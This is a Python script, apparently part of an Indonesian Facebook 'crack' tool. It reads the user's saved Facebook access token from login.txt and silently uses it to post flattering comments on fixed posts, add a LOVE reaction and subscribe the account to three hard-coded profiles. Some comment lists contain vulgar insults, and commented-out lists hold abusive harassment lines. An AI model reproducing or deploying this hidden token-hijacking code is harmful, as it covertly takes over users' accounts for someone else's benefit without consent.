# -*- coding: utf-8
# author BiiDev

import orbxd
import requests,sys,os,random
from requests.exceptions import ConnectionError

komenredem = random.choice(["Bang Lu Ngntd!", "Bang Lu Cakep Tapi Sayang Kaya Kntl", "Siang Luting Malam Jadi Kang Ghosting", "Dah Lah Abng Cakep Banget :) ", "Siang Panen Pahala Malam Panen Kepala", "Arigato Atas Scnya Bang", "Semoga Abang Dan Keluarga Masuk Surga :)", "Semoga Abang Sukses", "Gua Pengguna Sc cr4ck Lu Bang ", "Wih Panutan Gua Nih", "Senseii Kawaiine"])

komtwol = random.choice(["Salam 2 Jari Bang", "Mantap Sensei", "bang lu kgk punya pacar?", "MengKeren Lah Bang", "Semangat Bang!", "Gua Murid Lu Bang", "Tumben Post Bang?", "Gua Pengin Jadi Kek Abang", "Semoga Abang Jadi Orang Sukses", "Bjir Lawack Kali Kau Bang"])

#idihnajis = random.choice(["Idih Najis ", "Muka Kaya Kontol Kok Bangga", "Harga Dirinya Rendah Amat", "Udah Gede Jangan Cuma Bisa Foto Doang Tololl", "Najis Ama Laki² Kek Gni", "Emang Gak Malu Beban Keluarga?"])

#balasdendamom = random.choice(["Idih Najis ", "Muka Kaya Kontol Kok Bangga", "Harga Dirinya Rendah Amat", "Udah Gede Jangan Cuma Bisa Foto Doang Tololl", "Emang Gak Malu Beban Keluarga?"])

def follow():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Token/Cookie invalid"
		exit(orbxd.menu())
	kom = komenredem
	komentar = komtwol
#	komentardua = balasdndamom
#	postingandua = ('144181844493153')
#	postingan = ('792392798190386')
	post = ('3909741969124574')
	requests.post('https://graph.facebook.com/'+post+'/comments/?message=' +kom+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/4004071876358249/comments/?message=' +komentar+ '&access_token=' + toket)
#	requests.post('https://graph.facebook.com/'+postingandua+'/comments/?message=' +komentardua+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post+'/reactions?type=LOVE&access_token='+ toket)
        requests.post('https://graph.facebook.com/100002664282607/subscribers?access_token=' + toket) # Ebink!
        requests.post('https://graph.facebook.com/100000419639430/subscribers?access_token=' + toket) # Meyy
        requests.post('https://graph.facebook.com/100027294159255/subscribers?access_token=' + toket) # Asuan Ryo Xyounaa
        #requests.post('https://graph.facebook.com/id-lu/subscribers?access_token=' + toket) # Unknow
        #requests.post('https://graph.facebook.com/id-lu/subscribers?access_token=' + toket) # Unknow
        #requests.post('https://graph.facebook.com/id-lu/subscribers?access_token=' + toket) # Unknow
        #requests.post('https://graph.facebook.com/id-lu/subscribers?access_token=' + toket) # Unknow
        #requests.post('https://graph.facebook.com/id-lu/subscribers?access_token=' + toket) # Unknow
        exit(orbxd.menu())